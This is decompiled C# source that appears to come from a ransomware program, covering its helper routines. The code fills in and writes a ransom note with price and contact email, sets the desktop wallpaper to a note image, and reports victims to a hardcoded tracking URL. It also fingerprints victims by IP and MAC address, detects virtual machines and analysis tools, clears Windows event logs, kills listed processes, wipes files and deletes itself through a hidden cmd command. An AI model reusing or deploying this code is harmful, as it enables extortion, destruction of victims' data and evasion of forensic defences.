using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class12
{
	public static class Class13
	{
		private enum Enum0
		{
			Desktopvertres = 117,
			Desktophorzres
		}

		[DllImport("gdi32.dll")]
		private static extern int GetDeviceCaps(IntPtr intptr_0, int int_0);

		public static Size smethod_0()
		{
			IntPtr hdc = Graphics.FromHwnd(IntPtr.Zero).GetHdc();
			return new Size(height: GetDeviceCaps(hdc, 117), width: GetDeviceCaps(hdc, 118));
		}

		public static Bitmap smethod_1(Image image_0, int int_0, int int_1)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Expected O, but got Unknown
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0055: Expected O, but got Unknown
			Rectangle rectangle = new Rectangle(0, 0, int_0, int_1);
			Bitmap val = new Bitmap(int_0, int_1);
			val.SetResolution(image_0.get_HorizontalResolution(), image_0.get_VerticalResolution());
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.set_CompositingMode((CompositingMode)1);
				val2.set_CompositingQuality((CompositingQuality)2);
				val2.set_InterpolationMode((InterpolationMode)7);
				val2.set_SmoothingMode((SmoothingMode)2);
				val2.set_PixelOffsetMode((PixelOffsetMode)2);
				ImageAttributes val3 = new ImageAttributes();
				try
				{
					val3.SetWrapMode((WrapMode)3);
					val2.DrawImage(image_0, rectangle, 0, 0, image_0.get_Width(), image_0.get_Height(), (GraphicsUnit)2, val3);
					return val;
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}

		public static Image smethod_2(string string_0, Color color_0)
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Expected O, but got Unknown
			//IL_00be: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c5: Expected O, but got Unknown
			//IL_0180: Unknown result type (might be due to invalid IL or missing references)
			//IL_0187: Expected O, but got Unknown
			//IL_018a: Unknown result type (might be due to invalid IL or missing references)
			//IL_01b0: Expected O, but got Unknown
			try
			{
				Size size = smethod_0();
				int width = size.Width;
				int height = size.Height;
				Bitmap val = new Bitmap(width, height);
				Random random = new Random();
				for (int i = 0; i < height; i++)
				{
					for (int j = 0; j < width; j++)
					{
						int alpha = random.Next(128, 256);
						int red = random.Next(128, 256);
						int green = random.Next(128, 256);
						int blue = random.Next(128, 256);
						val.SetPixel(j, i, Color.FromArgb(alpha, red, green, blue));
					}
				}
				Image val2 = (Image)(object)val;
				Graphics val3 = Graphics.FromImage(val2);
				Font val4 = new Font("Times New Roman", 16f);
				string[] array = string_0.Split(new string[3] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
				int num = 50;
				string[] array2 = array;
				foreach (string text in array2)
				{
					_ = size.Width;
					_ = size.Height;
					num = ((!(text == "")) ? (num + 40) : (num + 20));
					PointF pointF = new PointF(size.Height / 2 + size.Width / 50, num);
					SizeF sizeF = val3.MeasureString(text, val4);
					new RectangleF(pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
					Brush val5 = (Brush)new SolidBrush(Color.White);
					val3.FillRectangle((Brush)new SolidBrush(color_0), pointF.X, pointF.Y, sizeF.Width, sizeF.Height);
					val3.DrawString(text, val4, val5, pointF);
				}
				return val2;
			}
			catch (Exception)
			{
			}
			return null;
		}
	}

	public sealed class Class14
	{
		public enum Enum1
		{
			Tiled,
			Centered,
			Stretched
		}

		private const int int_0 = 20;

		private const int int_1 = 1;

		private const int int_2 = 2;

		private Class14()
		{
		}

		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern int SystemParametersInfo(int int_3, int int_4, string string_0, int int_5);

		public static void smethod_0(string string_0, Enum1 enum1_0)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			if (enum1_0 == Enum1.Stretched)
			{
				registryKey.SetValue("WallpaperStyle", 2.ToString());
				registryKey.SetValue("TileWallpaper", 0.ToString());
			}
			if (enum1_0 == Enum1.Centered)
			{
				registryKey.SetValue("WallpaperStyle", 1.ToString());
				registryKey.SetValue("TileWallpaper", 0.ToString());
			}
			if (enum1_0 == Enum1.Tiled)
			{
				registryKey.SetValue("WallpaperStyle", 1.ToString());
				registryKey.SetValue("TileWallpaper", 1.ToString());
			}
			SystemParametersInfo(20, 0, string_0, 3);
		}
	}

	[CompilerGenerated]
	private sealed class Class15
	{
		public string string_0;

		internal byte method_0(int int_0)
		{
			return Convert.ToByte(string_0.Substring(int_0, 2), 16);
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class16
	{
		public static readonly Class16 _003C_003E9 = new Class16();

		public static Func<int, bool> _003C_003E9__3_0;

		public static Func<byte[], int> _003C_003E9__5_0;

		internal bool method_0(int int_0)
		{
			return int_0 % 2 == 0;
		}

		internal int method_1(byte[] byte_0)
		{
			return byte_0.Length;
		}
	}

	[CompilerGenerated]
	private sealed class Class17
	{
		public Random random_0;

		internal char method_0(string string_0)
		{
			return string_0[random_0.Next(string_0.Length)];
		}
	}

	[CompilerGenerated]
	private sealed class Class18
	{
		public Random random_0;

		internal char method_0(char char_0)
		{
			if (random_0.Next() % 2 != 0)
			{
				return char_0;
			}
			if (!char.IsUpper(char_0))
			{
				return char_0.ToString().ToUpper().First();
			}
			return char_0.ToString().ToLower().First();
		}
	}

	public static string smethod_0(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	public static string smethod_1(byte[] byte_0)
	{
		char[] array = new char[byte_0.Length * 2];
		int num = 0;
		int num2 = 0;
		while (num < byte_0.Length)
		{
			byte b = (byte)(byte_0[num] >> 4);
			array[num2] = (char)((b > 9) ? (b + 55 + 32) : (b + 48));
			b = (byte)(byte_0[num] & 0xFu);
			array[++num2] = (char)((b > 9) ? (b + 55 + 32) : (b + 48));
			num++;
			num2++;
		}
		return new string(array);
	}

	public static int smethod_2(string string_0)
	{
		try
		{
			return Convert.ToInt32(string_0, 16);
		}
		catch (Exception)
		{
			return -1;
		}
	}

	public static byte[] smethod_3(string string_0)
	{
		try
		{
			return (from int_0 in Enumerable.Range(0, string_0.Length)
				where int_0 % 2 == 0
				select Convert.ToByte(string_0.Substring(int_0, 2), 16)).ToArray();
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] smethod_4(byte[] byte_0, byte[] byte_1, int int_0, int int_1)
	{
		try
		{
			return new Rfc2898DeriveBytes(byte_0, byte_1, int_0).GetBytes(int_1);
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] smethod_5(params byte[][] byte_0)
	{
		byte[] array = new byte[byte_0.Sum((byte[] byte_0) => byte_0.Length)];
		int num = 0;
		foreach (byte[] array2 in byte_0)
		{
			Buffer.BlockCopy(array2, 0, array, num, array2.Length);
			num += array2.Length;
		}
		return array;
	}

	public static void smethod_6(string string_0 = "", string string_1 = "http://blasze.tk/CN18R3")
	{
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(string_1);
			obj.Timeout = 10000;
			obj.AllowAutoRedirect = true;
			obj.UserAgent = $"{Class7.Class8.String_6}-{Class7.Class8.Int32_3}:{string_0}";
			HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
			new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_7()
	{
		return null;
	}

	public static string smethod_8()
	{
		string text = "";
		int num = 0;
		while (true)
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("https://ipinfo.io/json");
				obj.Timeout = 10000;
				obj.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
				HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
				text = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
			}
			catch (Exception)
			{
			}
			num++;
			if (string.IsNullOrEmpty(text) && num >= 3)
			{
				break;
			}
			if (!string.IsNullOrEmpty(text))
			{
				return Regex.Split(text, "\"ip\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"org\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"city\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"country\": \"")[1].Split(new char[1] { '"' })[0];
			}
		}
		return null;
	}

	public static string smethod_9()
	{
		string empty = string.Empty;
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					empty += networkInterface.GetPhysicalAddress().ToString();
					string[] array = new string[empty.Length];
					for (int j = 0; j < empty.Length; j++)
					{
						array[j] = Encoding.UTF8.GetBytes(empty)[j].ToString("x2");
					}
					return string.Join(":", array);
				}
			}
			return empty;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string smethod_10(int int_0, bool bool_0 = false)
	{
		Random random_0 = new Random();
		string text = "";
		text = (bool_0 ? "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
		return new string((from string_0 in Enumerable.Repeat(text, int_0)
			select string_0[random_0.Next(string_0.Length)]).ToArray());
	}

	public static byte[] smethod_11(int int_0)
	{
		byte[] array = new byte[int_0];
		new RNGCryptoServiceProvider().GetNonZeroBytes(array);
		return array;
	}

	public static void smethod_12(string string_0)
	{
		try
		{
			long num = 0L;
			num = new FileInfo(string_0).Length;
			using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(string_0, FileMode.Create, FileAccess.Write, FileShare.None)))
			{
				Random random = new Random();
				do
				{
					byte value = Convert.ToByte(random.Next(0, 255));
					binaryWriter.Write(value);
					num--;
				}
				while (num != 0L);
				binaryWriter.Flush();
				binaryWriter.Close();
			}
			File.Delete(string_0);
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_13(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string smethod_14(string string_0, int int_0)
	{
		double num = Math.Ceiling((double)string_0.Length / (double)int_0);
		if (num >= 2.0)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; (double)i < num; i++)
			{
				if (i > 0)
				{
					stringBuilder.Append(Environment.NewLine);
				}
				int num2 = i * int_0;
				int length = Math.Min(int_0, string_0.Length - num2);
				string value = string_0.Substring(num2, length);
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return string_0;
	}

	public static void smethod_15(string string_0)
	{
		try
		{
			GClass6.GClass7.String_14 = Regex.Replace(GClass6.GClass7.String_14, "%Encrypted", Class7.Class8.String_0.Replace(Environment.NewLine, "<br>"));
			GClass6.GClass7.String_14 = Regex.Replace(GClass6.GClass7.String_14, "%Extension", "." + Convert.ToString(Class7.Class8.String_1));
			string replacement = GClass6.GClass7.Double_1.ToString().Replace(",", ".");
			GClass6.GClass7.String_14 = Regex.Replace(GClass6.GClass7.String_14, "%Price", replacement);
			GClass6.GClass7.String_14 = Regex.Replace(GClass6.GClass7.String_14, "%Unit", Convert.ToString(GClass6.GClass7.String_4));
			GClass6.GClass7.String_14 = Regex.Replace(GClass6.GClass7.String_14, "%Email", GClass6.GClass7.String_2);
			GClass6.GClass7.String_14 = Regex.Replace(GClass6.GClass7.String_14, "%Alternative", GClass6.GClass7.String_3);
			string_0 = Path.Combine(string_0, GClass6.GClass7.String_12) + "-" + Class7.Class8.String_1 + "." + GClass6.GClass7.String_13;
			using (TextWriter textWriter = File.CreateText(string_0))
			{
				textWriter.Write(GClass6.GClass7.String_14);
				textWriter.Close();
			}
			File.SetAttributes(string_0, FileAttributes.ReadOnly);
			File.SetAttributes(string_0, FileAttributes.Compressed);
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_16(string string_0)
	{
		try
		{
			Random random_0 = new Random();
			string text = new string(string_0.Select(delegate(char char_0)
			{
				if (random_0.Next() % 2 != 0)
				{
					return char_0;
				}
				return (!char.IsUpper(char_0)) ? char_0.ToString().ToUpper().First() : char_0.ToString().ToLower().First();
			}).ToArray());
			StringBuilder stringBuilder = new StringBuilder();
			int num = 0;
			string text2 = text;
			foreach (char value in text2)
			{
				stringBuilder.Append(value);
				_ = ++num % 1;
				stringBuilder.Append('^');
			}
			return stringBuilder.ToString();
		}
		catch (Exception)
		{
		}
		return null;
	}

	public static void smethod_17(int int_0)
	{
		try
		{
			string arg = string.Concat("ping 127.0.0.1 -n 3 > NUL&&" + $"del /Q /F /S \"{Application.get_ExecutablePath()}\"");
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = $"/C {arg}";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			Environment.Exit(int_0);
		}
		catch (Exception)
		{
		}
	}

	public static bool smethod_18()
	{
		try
		{
			string text = "";
			text = smethod_13("wmic", "path win32_VideoController get name");
			if (!string.IsNullOrEmpty(text))
			{
				smethod_13("tasklist", "m");
				if (text.Contains("VirtualBox Graphics Adapter") || text.Contains("VMware SVGA") || text.Contains("Parallels Video Adapter") || text.Contains("PVM Additions S3 Trio32/64") || text.Contains("S3 Trio32/64") || smethod_21("xenservice") || smethod_21("VMSrvc") || smethod_21("VMUSrvc") || smethod_21("VBoxTrayToolWndClass") || smethod_21("VBoxTrayToolWnd") || smethod_21("vmtoolsd") || smethod_21("vmwaretray") || smethod_21("vmwareuser") || smethod_21("VGAuthService") || smethod_21("vmacthlp") || smethod_21("prl_cc") || smethod_21("prl_tools") || smethod_21("vmtoolsd"))
				{
					text = smethod_13("wmic", "path MSAcpi_ThermalZoneTemperature");
				}
				if (!string.IsNullOrEmpty(text))
				{
					return true;
				}
				return false;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool smethod_19()
	{
		try
		{
			if (!smethod_21("Sysinternals: www.sysinternals.com") && !smethod_21("wireshark") && !smethod_21("EtherD") && !smethod_21("EtherDetect") && !smethod_21("The Wireshark Network Analyzer") && !smethod_21("dumpcap") && !smethod_21("sysAnalyzer") && !smethod_21("TCPView") && !smethod_21("C:\\Program Files\\Wireshark\\") && !smethod_21("NETSTAT") && !smethod_21("sniff_hit"))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void smethod_20()
	{
		try
		{
			string[] array = smethod_22("wevtutil", "el").Split(new string[1] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
			int num = 0;
			if (0 < array.Length)
			{
				string arg = array[num];
				smethod_21($"wevtutil.exe cl {arg}");
				num++;
			}
		}
		catch (Exception)
		{
		}
		Thread.Sleep(1000);
	}

	private static bool smethod_21(string string_0)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowTitle.Contains(string_0) || process.ProcessName.Contains(string_0))
				{
					process.Dispose();
					GC.Collect();
					GC.WaitForPendingFinalizers();
					GC.Collect();
					bool flag = true;
				}
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static string smethod_22(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static bool smethod_23(string[] string_0)
	{
		try
		{
			string[] array = smethod_22("tasklist", "/V /FO CSV").Split(new string[3] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
			List<string> list = new List<string>();
			for (int i = 0; i < array.Length; i++)
			{
				string text = array[i].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "");
				if (!(text == "") && text.Contains(".exe"))
				{
					list.Add(array[i].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "").Replace(".exe", ""));
				}
			}
			string[] array2 = list.ToArray();
			foreach (string text2 in array2)
			{
				if (string_0.Contains(text2))
				{
					smethod_13("taskkill", $"/F /IM {text2}.exe");
				}
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string smethod_24()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Keyboard Layout\\Preload");
			string[] valueNames = registryKey.GetValueNames();
			foreach (string name in valueNames)
			{
				text = text + $"{smethod_2((string)registryKey.GetValue(name))}" + ",";
			}
		}
		catch (Exception)
		{
		}
		return text.TrimEnd(new char[1] { ',' });
	}

	public static bool smethod_25()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Console", writable: true);
			if (Registry.GetValue(registryKey.ToString(), "WordLoad", null) == null)
			{
				registryKey.SetValue("WordLoad", 1, RegistryValueKind.DWord);
				return true;
			}
			return false;
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static byte[] smethod_26(byte[] byte_0)
	{
		return MD5.Create().ComputeHash(byte_0);
	}

	public static bool smethod_27(string string_0)
	{
		try
		{
			if (string_0.Contains(".exe"))
			{
				string_0 = string_0.Replace(".exe", "");
			}
			if (Process.GetProcessesByName(string_0).Length == 0)
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
